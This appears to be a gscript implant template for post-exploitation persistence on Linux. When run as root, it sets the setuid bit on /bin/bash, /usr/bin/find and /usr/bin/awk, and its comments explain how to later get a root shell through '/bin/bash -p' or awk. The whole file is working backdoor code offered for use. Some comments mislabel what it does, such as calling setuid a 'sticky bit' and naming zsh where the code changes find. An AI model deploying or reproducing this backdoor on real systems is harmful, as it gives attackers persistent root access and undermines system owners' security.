// Example gscript template
// Title: SUID Persistence
// Author: ahhh
// Purpose: sets the sticky bit on bash as root, for easy future priv esc
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1166
// Tactic: Later need to invoke "/bin/bash -p" to use SUID backdoor
// Note: Must run implant as root

//priority:90
//timeout:150

//go_import:os/user as user2
  
  function Deploy() {
    console.log("starting execution of SUID Persistence");
    // get user homedir
    var user = user2.Current();
    console.log("Our user is: "+user[0].Username);
    if (user[0].Username == "root") {
        // setting /bin/bash to U+S
        var err = G.exec.ExecuteCommand("chmod", ["u+s", "/bin/bash"]);
        console.log(Dump(err));
        err = G.exec.ExecuteCommand("chmod", ["u+x", "/bin/bash"]);
        console.log(Dump(err));
        console.log("Set /bin/bash");  
        // setting /bin/zsh to U+S
        err = G.exec.ExecuteCommand("chmod", ["u+s", "/usr/bin/find"]);
        console.log(Dump(err));
        err = G.exec.ExecuteCommand("chmod", ["u+x", "/usr/bin/find"]);
        console.log(Dump(err));
        console.log("Set /bin/zsh");
        // setting awk
        // USAGE: awk '{ system("/bin/sh") }'
        err = G.exec.ExecuteCommand("chmod", ["u+s", "/usr/bin/awk"]);
        console.log(Dump(err));
        err = G.exec.ExecuteCommand("chmod", ["u+x", "/usr/bin/awk"]);
        console.log(Dump(err));
        console.log("Set /usr/bin/awk");

    } else {
        console.log("Detected a non-root user, this needs to run as root!");
        //Halt();
    }

    console.log("done SUID Persistence");
    return true;
  }